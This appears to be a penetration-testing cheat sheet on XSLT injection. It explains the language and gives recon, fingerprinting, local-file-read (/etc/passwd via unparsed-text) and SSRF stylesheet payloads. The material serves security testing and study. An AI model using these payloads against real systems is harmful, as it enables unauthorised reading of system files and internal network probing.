# Basic Information

It stands for Extensible Stylesheet Language Transformations and is a language used for transforming XML documents to either XML or other formats like HTML, SVG, SVG, plain text, etc…

As listed in Wikipedia page for XSLT:

>Although XSLT is designed as a special-purpose language for XML transformation, the language is Turing-complete, making it theoretically capable of arbitrary computations.

XSLT provides constructs like loops, if, switch-case, and other functions like substring, etc. to perform manipulations to the XML documents. Not only that, it even allows you to define functions and call them as well.

It uses XPath to locate the different subsets of the XML document tree and then it can be used to perform operations on them: check for their values, perform functions on the contents, and much much more.

There’s a really awesome tutorial on [XSLT and XPath](https://www.youtube.com/watch?v=WggVR4YI5oI).

# XSLT Injections

If a user is able to supply their own XSLT files or inject XSLT tags, then this can result in XSLT injections. The constructs that you have at your disposal greatly depend on the processor that’s being used and the version of the XSLT specification. Version 1 is most widely used and supported because the newer versions: 2 & 3 are backwards compatible and also because the browsers support version 1 and hence, the popularity.

Version 2 & 3 have a lot more features compared to version 1 so the exploitation becomes much more easy with the higher versions. But still, with 1, you can get a lot of stuff done. Here are some interesting issues:

- RCE
- Local File Read (via error messages)
- XXE
- SSRF and Port Scans

# Recon

recon.xsl

```
<xsl:value-of select="system-property('xsl:version')" />
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:vendor-url')" />
```

# Installation of Required Packages

```
sudo apt install default-jdk libsaxon-java libsaxonb-java
```

# Example

To see how it works we can use this two basic files and upload them

xml.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
    <cd>
        <title>CD Title</title>
        <artist>The artist</artist>
        <company>Da Company</company>
        <price>10000</price>
        <year>1760</year>
    </cd>
</catalog>
```

xsl.xsl

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
    <html>
    <body>
    <h2>The Super title</h2>
    <table border="1">
        <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>artist</th>
        </tr>
        <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
        </tr>
    </table>
    </body>
    </html>
</xsl:template>
</xsl:stylesheet>
```

# Fingerprint

fingerprint.xml

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```

# Read Local File

recon.xml

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

# SSRF

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

